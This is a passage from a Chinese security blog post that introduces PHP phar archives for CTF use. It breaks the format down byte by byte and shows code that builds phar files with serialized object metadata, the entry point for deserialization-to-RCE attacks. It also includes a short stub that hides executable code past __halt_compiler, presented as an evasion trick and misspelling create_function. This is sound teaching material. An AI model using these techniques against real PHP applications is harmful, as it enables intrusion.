<!DOCTYPE html>
<html lang="en">

<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
<head>
  <!-- Google Analytics -->
  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-V3C5GQ73TE"></script>
    <script type="text/javascript">
      window.dataLayer = window.dataLayer || [];

      function gtag() {
        dataLayer.push(arguments);
      }
      gtag('js', new Date());

      gtag('config', 'G-V3C5GQ73TE');
    </script>
  

  <!-- Baidu Tongji -->
  
    <script type="text/javascript">
      // Originial
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?x";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  <!-- Baidu Push -->
  
    <script>
      (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
      })();
    </script>
  

  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>

  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>

  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="description" content="Morouu的大狗窝 ●&#39;◡&#39;●"/>
  <meta name="keyword" content="Morouu,morouu"/>
  <link rel="shortcut icon" href="//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302341051.png"/>

  <!-- Place this tag in your head or just before your close body tag. -->
  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>

  
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/beantech.min.css"/>

    <!-- Pygments Highlight CSS -->
    <link rel="stylesheet" href="/css/highlight.css"/>
    <link rel="stylesheet" href="/css/widget.css"/>
    <link rel="stylesheet" href="/css/rocket.css"/>
    <link rel="stylesheet" href="/css/signature.css"/>
    <link rel="stylesheet" href="/css/catalog.css"/>
    <link rel="stylesheet" href="/css/livemylife.css"/>

    
      <!-- wave start -->
      <link rel="stylesheet" href="/css/wave.css"/>
      <!-- wave end -->
    

    
      <!-- top start (article top hot config) -->
      <link rel="stylesheet" href="/css/top.css"/>
      <!-- top end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/scroll.css"/>
      <!-- ThemeColor end -->
    

    
      <!-- viewer start (Picture preview) -->
      <link rel="stylesheet" href="/css/viewer.min.css"/>
      <!-- viewer end -->
    

    
      <!-- Search start -->
      <link rel="stylesheet" href="/css/search.css"/>
      <!-- Search end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/themecolor.css"/>
      <!-- ThemeColor end -->
    

    

    
  

  <!-- Custom Fonts -->
  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
  <!-- Hux change font-awesome CDN to qiniu -->
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->

  <!-- ga & ba script hoook -->
  <link rel="canonical" href="https://morblog.cc/posts/2586386993/">
  <title>
    
      总结 - ctf中php的phar(一) - Morouu的大狗窝 ●&#39;◡&#39;●
    
  </title>
<meta name="generator" content="Hexo 5.4.0"></head>


<!-- hack iOS CSS :active style -->

	<body ontouchstart="" class="body--light body--light">


		<!-- ThemeColor -->
		
		<!-- ThemeColor -->
<style type="text/css">
  .body--light {
    --light-mode: none;
    --dark-mode: block;
  }
  .body--dark {
    --light-mode: block;
    --dark-mode: none;
  }
  i.mdui-icon.material-icons.light-mode {
    display: var(--light-mode);
  }
  i.mdui-icon.material-icons.dark-mode {
    display: var(--dark-mode);
  }
</style>
<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
  <i class="mdui-icon material-icons light-mode"></i>
  <i class="mdui-icon material-icons dark-mode"></i>
</div>
<script>
  //getCookieValue
  function getCookieValue(a) {
    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
    return b
      ? b.pop()
      : '';
  }
  let themeMode = 'light';
  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
    let dbody = document.body.classList;
    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
  }

  //setCookieValue
  var toggleBtn = document.querySelector(".toggle");
  toggleBtn.addEventListener("click", function () {
    var e = document.body.classList.contains("body--dark");
    var cookieString = e
      ? "dark"
      : "light";
    var exp = new Date();
    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
  });
</script>

		

		<!-- Gitter -->
		
		<!-- Gitter -->
<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
<script>
  ((window.gitter = {}).chat = {}).options = {
    room: 'dmantick/morcruiser'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

		

		<!-- Navigation (contains search)-->
		<!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header page-scroll">
      <button type="button" class="navbar-toggle">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Morouu的大狗窝 ●&#39;◡&#39;●</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
    <div id="huxblog_navbar">
      <div class="navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
          <li>
            <a href="/">首页</a>
          </li>

          
          
          <li>
            <a href="/about/">
              
              关于
              
              
            </a>
          </li>
          
          
          
          
          
          <li>
            <a href="/categories/">
              
              分类
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/tags/">
              
              标签
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/archive/">
              
              归档
              
              
            </a>
          </li>
          
          

          
          <li>
            <a class="popup-trigger">
              <span class="search-icon"></span>搜索</a>
          </li>
          

          <!-- LangSelect -->
          
          
          
          
          
        </ul>
      </div>
    </div>
    <!-- /.navbar-collapse -->
  </div>
  <!-- /.container -->
</nav>
<!-- progress -->
<div id="progress">
  <div class="line" style="width: 0%;"></div>
</div>

<script>
  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
  var $body = document.body;
  var $toggle = document.querySelector('.navbar-toggle');
  var $navbar = document.querySelector('#huxblog_navbar');
  var $collapse = document.querySelector('.navbar-collapse');

  $toggle.addEventListener('click', handleMagic)

  function handleMagic(e) {
    if ($navbar.className.indexOf('in') > 0) {
      // CLOSE
      $navbar.className = " ";
      // wait until animation end.
      setTimeout(function() {
        // prevent frequently toggle
        if ($navbar.className.indexOf('in') < 0) {
          $collapse.style.height = "0px"
        }
      }, 400)
    } else {
      // OPEN
      $collapse.style.height = "auto"
      $navbar.className += " in";
    }
  }
</script>


		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
		<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->

  <style type="text/css">
    .body--light {
      /* intro-header */
      --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271440793.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271440793.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }
    .body--dark {
      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271440793.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271440793.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }

    header.intro-header {
       /*post*/
        background-image: var(--intro-header-background-image-url-post);
        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271440793.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
      
    }

    
      #signature {/*signature*/
        background-image: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302343273.png');
      }
    
  </style>





<header class="intro-header">
  <!-- Signature -->
  <div id="signature">
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
          
          <div class="post-heading">
            <div class="tags">
              
              <a class="tag" href="/tags/#安全" title="安全">安全</a>
              
              <a class="tag" href="/tags/#PHP" title="PHP">PHP</a>
              
              <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
              
            </div>
            <h1>总结 - ctf中php的phar(一)</h1>
            <h2 class="subheading"></h2>
            <span class="meta">
              Posted by morouu on
              2022-01-27
            </span>


            
            <!-- WordCount start -->
            <div class="blank_box"></div>
            <span class="meta">
              Estimated Reading Time <span class="post-count" >59</span> Minutes
            </span>
            <div class="blank_box"></div>
            <span class="meta">
              Words <span class="post-count">12.7k</span> In Total
            </span>
            <div class="blank_box"></div>
            <!-- WordCount end -->
            
            
            <!-- 不蒜子统计 start -->
            <span class="meta" id="busuanzi_container_page_pv">
              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
            </span>
            <!-- 不蒜子统计 end -->
            


          </div>
          
        </div>
      </div>
    </div>
  </div>

  
  <!-- waveoverlay start -->
  <div class="preview-overlay">
    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
      <defs>
        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
      </defs>
      <g class="preview-parallax">
        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
      </g>
    </svg>
  </div>
  <!-- waveoverlay end -->
  

</header>



		<!-- Main Content (Post contains
	Pager、
	tip、
	socialshare、
	gitalk、gitment、disqus-comment、
	Catalog、
	Sidebar、
	Featured-Tags、
	Friends Blog、
	anchorjs、
	) -->
		<!-- Modify by Yu-Hsuan Yen -->
<!-- Post Content -->
<article>
  <div class="container" style="margin-left: 10%;">
    <div class="row">
      <!-- Post Container -->
      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">

        <h1>总结 - ctf中php的phar(一)</h1>
<hr>
<h2 id="前言">- 前言 -</h2>
<p>相信不少伙伴们对 <code>php</code> 中有关 <code>phar</code> 内容的认识都是从 <code>反序列化</code> 开始的，实际上本人也是如此。不得不说 <code>phar</code> 这玩意真的是给很多能由反序列化拿到 <strong>RCE</strong> 的应用撕开了一个很不错的开口，但有关这个 <code>phar</code> 的 <code>反序列化</code> 也是有可进行扩展的地方。</p>
<h2 id="phar">- phar -</h2>
<p>那么在进行正文前，不妨先对 <code>phar</code> 这个玩意先做一个简单的说明。由于在 <code>php8.0+</code> 中已经明示可以和 <code>phar</code> 的 <code>反序列化</code> 说拜拜了，这里就用 <code>php7.0+</code> 的环境来做说明吧。实际上 <code>phar</code> 原来的想法就是将一堆代码文件的归档成一个文件，然后只需要用 <code>phar</code> 协议解析这一个归档中任一个被打包的代码文件就可以去执行其中指定的代码(相当于php应用的u盘)。比如将以下文件归档成 <code>phar</code> 文件(<code>myphar.phar</code>)👇</p>
<ul>
<li><code>login.php</code></li>
<li><code>home.php</code></li>
<li><code>logout.php</code></li>
</ul>
<p>那么假设想在主页做一个简单的包含路由，只需要这么写👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]??<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_null(<span class="variable">$page</span>) <span class="keyword">and</span> in_array(<span class="variable">$page</span>,[<span class="string">&#x27;login&#x27;</span>,<span class="string">&#x27;home&#x27;</span>,<span class="string">&#x27;index&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&quot;phar://path/to/myphar.phar/<span class="subst">&#123;$page&#125;</span>.php&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>就可以只用两个文件 <code>index.php</code> 和 <code>myphar.phar</code> 实现了，确实是比较不错的。</p>
<h3 id="结构">- 结构 -</h3>
<p>首先要说明的是 <code>phar</code> 是支持以下三种文件格式归档的👇</p>
<ul>
<li><code>phar(或phar.gz/phar.bz2)</code></li>
<li><code>tar</code></li>
<li><code>zip</code></li>
</ul>
<p>其中这类归档格式包含三到四个部分👇</p>
<ul>
<li><code>stub(存根)</code></li>
<li><code>a manifest describing the contents(描述内容的清单)</code></li>
<li><code>the file contents(文件内容)</code></li>
<li><code>[optional] a signature for verifying Phar integrity([可选]验证phar完整性的签名,仅phar格式需要)</code></li>
</ul>
<p>这到后面的应用会详细说，这里先简单地先分析默认 <code>phar</code> 归档格式罢。</p>
<h4 id="stub">- stub -</h4>
<p>先来看 <code>stub</code> 这玩意，简单来说即是用来判断 <code>phar</code> 内容的开头标志，在 <code>php</code> 中也有对应的常量 <code>__COMPILER_HALT_OFFSET__</code> 👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="keyword">__FILE__</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">fseek(<span class="variable">$fp</span>, __COMPILER_HALT_OFFSET__);</span><br><span class="line">create_funcion(<span class="string">&quot;&quot;</span>, stream_get_contents(<span class="variable">$fp</span>));</span><br><span class="line"><span class="comment"><span class="keyword">__halt_compiler</span>();&#125;phpinfo();/*</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
<p>以上可以执行 <code>phpinfo();</code> 代码(算是免杀技巧之一吧)。</p>
<p>按照官方文档来说如果是纯 <code>phar</code> 格式的归档文件，这个 <code>stub</code> 是必须的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201241308542.png" alt="image-20220124130843409"></p>
<p>并且在构造 <code>stub</code> 的时候必须以 <code>__HALT_COMPILER(); ?&gt;</code> 结尾，同时 <code>__HALT_COMPILER();</code> 必须得是大写的(如果在使用 <code>setStub</code> 方法构造的时候不以 <code>__HALT_COMPILER(); ?&gt;</code> 结尾，生成的文件会自动给补上)，以下的构造方式都是合法的👇</p>
<ul>
<li><code>[任意字符] __HALT_COMPILER(); ?&gt;</code></li>
</ul>
<p>当然，即便在构造 <code>phar</code> 的时候不调用 <code>setStub</code> 方法手动构造，构造出来的 <code>phar</code> 文件也是可以反序列化的，只是前面的部分会很长并且是一个完整的代码。</p>
<p>另外由于 <code>phar</code> 文件会在后面对所有内容做签名计算，所以每次构造不同 <code>stub</code> 内容的 <code>phar</code> 都得重新构造，而不能够直接在 <code>phar</code> 开头直接添加内容。</p>
<h4 id="manifest">- manifest -</h4>
<p>这玩意即是 <code>清单</code> 部分，可以看作是一个 <code>phar</code> 文件的信息总览，以下是摘自官方文档的表格👇</p>
<p><strong>Global Phar manifest format</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">Size in bytes</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Length of manifest in bytes (1 MB limit)</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Number of files in the Phar</td>
</tr>
<tr>
<td style="text-align:center">2 bytes</td>
<td style="text-align:center">API version of the Phar manifest (currently 1.0.0)</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Global Phar bitmapped flags</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Length of Phar alias</td>
</tr>
<tr>
<td style="text-align:center">??</td>
<td style="text-align:center">Phar alias (length based on previous)</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Length of Phar metadata (<code>0</code> for none)</td>
</tr>
<tr>
<td style="text-align:center">??</td>
<td style="text-align:center">Serialized Phar Meta-data, stored in <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a> format</td>
</tr>
<tr>
<td style="text-align:center">at least 24 * number of entries bytes</td>
<td style="text-align:center">entries for each file</td>
</tr>
</tbody>
</table>
<p>其实这么一看就一目了然了，其中，能够执行 <code>反序列化</code> 的罪魁祸首就存在 <code>Serialized Phar Meta-data</code> 部分，这到后面再说。同时 <code>Global Phar bitmapped flags</code> 这玩意存储的是这个 <code>phar</code> 文件的归档格式，这是对应的表格👇</p>
<p><strong>Bitmap values recognized</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">Value</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x00010000</td>
<td style="text-align:center">If set, this Phar contains a verification signature</td>
</tr>
<tr>
<td style="text-align:center">0x00001000</td>
<td style="text-align:center">If set, this Phar contains at least 1 file that is compressed with zlib DEFLATE compression</td>
</tr>
<tr>
<td style="text-align:center">0x00002000</td>
<td style="text-align:center">If set, this Phar contains at least 1 file that is compressed with bzip2 compression</td>
</tr>
</tbody>
</table>
<p>依然很简单就能够看懂，下面是 <code>manifest</code> 包含的归档文件元素👇</p>
<p><strong>Phar Manifest file entry</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">Size in bytes</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Filename length in bytes</td>
</tr>
<tr>
<td style="text-align:center">??</td>
<td style="text-align:center">Filename (length specified in previous)</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Un-compressed file size in bytes</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Unix timestamp of file</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Compressed file size in bytes</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">CRC32 checksum of un-compressed file contents</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Bit-mapped File-specific flags</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Serialized File Meta-data length (<code>0</code> for none)</td>
</tr>
<tr>
<td style="text-align:center">??</td>
<td style="text-align:center">Serialized File Meta-data, stored in <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a> format</td>
</tr>
</tbody>
</table>
<p>当然，这里的 <code>Serialized File Meta-data</code> 部分也是可以进行 <code>反序列化</code> 的，比如👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$p</span>-&gt;setStub(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;c&#x27;</span>]=<span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;c&#x27;</span>]-&gt;setMetadata(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<h4 id="content">- content -</h4>
<p>这个部分是所有归档文件的内容，放在 <code>manifest</code> 和 <code>signature</code> 之间。</p>
<h4 id="signature">- signature -</h4>
<p>顾名思义，这个部分就是用来计算前面所有内容的签名，但有且仅有在 <code>phar</code> 的归档格式中，像是 <code>tar</code> 或是 <code>zip</code> 的归档格式是没有这一块的。而根据官方文档， <code>phar</code> 支持的签名格式有👇</p>
<ul>
<li><code>MD5</code></li>
<li><code>SHA1</code></li>
<li><code>SHA256</code></li>
<li><code>SHA512</code></li>
<li><code>OPENSSL(这个是带密钥签名)</code></li>
</ul>
<p>可以在构造 <code>phar</code> 时使用 <code>setSignatureAlgorithm</code> 方法手动设置签名格式，比如 <code>setSignatureAlgorithm(Phar::MD5)</code> 。而对于 <code>OPENSSL</code> 的带密钥签名，在官方示例中，可以用以下方式构造👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$private</span> = openssl_get_privatekey(file_get_contents(<span class="string">&#x27;private.pem&#x27;</span>));</span><br><span class="line"><span class="variable">$pkey</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">openssl_pkey_export(<span class="variable">$private</span>, <span class="variable">$pkey</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setSignatureAlgorithm(Phar::OPENSSL, <span class="variable">$pkey</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是 <code>signature</code> 的官方表格👇</p>
<p><strong>Signature format</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">Length in bytes</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">varying</td>
<td style="text-align:center">The actual signature, 20 bytes for an SHA1 signature, 16 bytes for an MD5 signature, 32 bytes for an SHA256 signature, and 64 bytes for an SHA512 signature. The length of an OPENSSL signature depends on the size of the private key.</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Signature flags. <code>0x0001</code> is used to define an MD5 signature, <code>0x0002</code> is used to define an SHA1 signature, <code>0x0003</code> is used to define an SHA256 signature, and <code>0x0004</code> is used to define an SHA512 signature. The SHA256 and SHA512 signature support is available as of API version 1.1.0. <code>0x0010</code> is used to define an OPENSSL signature, what is available as of API version 1.1.1, if OpenSSL is available.</td>
</tr>
<tr>
<td style="text-align:center">4 bytes</td>
<td style="text-align:center">Magic <code>GBMB</code> used to define the presence of a signature.</td>
</tr>
</tbody>
</table>
<p>这里还可以看出，如果是 <code>phar</code> 的归档格式，最后 <code>4</code> 个字节必须是 <code>GBMB</code> 字符(也就是说如果是 <code>phar</code> 归档格式只能够在前面添加 <code>脏字符</code>)。</p>
<h3 id="文件解析">- 文件解析 -</h3>
<p>不妨对真实的 <code>phar</code> 文件内容进行解析，先简单生成一个 <code>phar</code> 文件👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> e;</span><br><span class="line"><span class="variable">$o</span>-&gt;a=<span class="string">&#x27;text&#x27;</span>;</span><br><span class="line">@unlink(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$p</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$p</span>-&gt;setStub(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a.txt&#x27;</span>]=<span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a.txt&#x27;</span>]-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>再使用 <code>010 editor</code> 打开，得到如图👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201241506595.png" alt="image-20220124150604501"></p>
<p>那么用表格简单分析一下👇</p>
<table>
<thead>
<tr>
<th style="text-align:center">Offset</th>
<th style="text-align:center">Start</th>
<th style="text-align:center">End</th>
<th style="text-align:center">Bytes</th>
<th style="text-align:center">Content</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><em>Stub</em></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">0000h</td>
<td style="text-align:center">0000h</td>
<td style="text-align:center">0014h</td>
<td style="text-align:center">18</td>
<td style="text-align:center">5F 5F 48 41 4C 54 5F 43 4F 4D 50 49 4C 45 52 28 29 3B 20 3F 3E</td>
<td style="text-align:center">stub部分</td>
</tr>
<tr>
<td style="text-align:center">0014h</td>
<td style="text-align:center">0015h</td>
<td style="text-align:center">0016h</td>
<td style="text-align:center">2</td>
<td style="text-align:center">0D 0A</td>
<td style="text-align:center">换行符</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><em>Manifest</em></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">0016h</td>
<td style="text-align:center">0017h</td>
<td style="text-align:center">001Ah</td>
<td style="text-align:center">4</td>
<td style="text-align:center">71 00 00 00</td>
<td style="text-align:center">manifest + file的总长度</td>
</tr>
<tr>
<td style="text-align:center">001Ah</td>
<td style="text-align:center">001Bh</td>
<td style="text-align:center">001Eh</td>
<td style="text-align:center">4</td>
<td style="text-align:center">01 00 00 00</td>
<td style="text-align:center">归档的文件数量</td>
</tr>
<tr>
<td style="text-align:center">001Eh</td>
<td style="text-align:center">001Fh</td>
<td style="text-align:center">0020h</td>
<td style="text-align:center">2</td>
<td style="text-align:center">11 00</td>
<td style="text-align:center">manifest的API版本</td>
</tr>
<tr>
<td style="text-align:center">0020h</td>
<td style="text-align:center">0021h</td>
<td style="text-align:center">0024h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">00 00 01 00</td>
<td style="text-align:center"><strong>Global Phar bitmapped flags</strong>(不太懂怎么翻译，这里的意思是这个phar包含签名验证部分)</td>
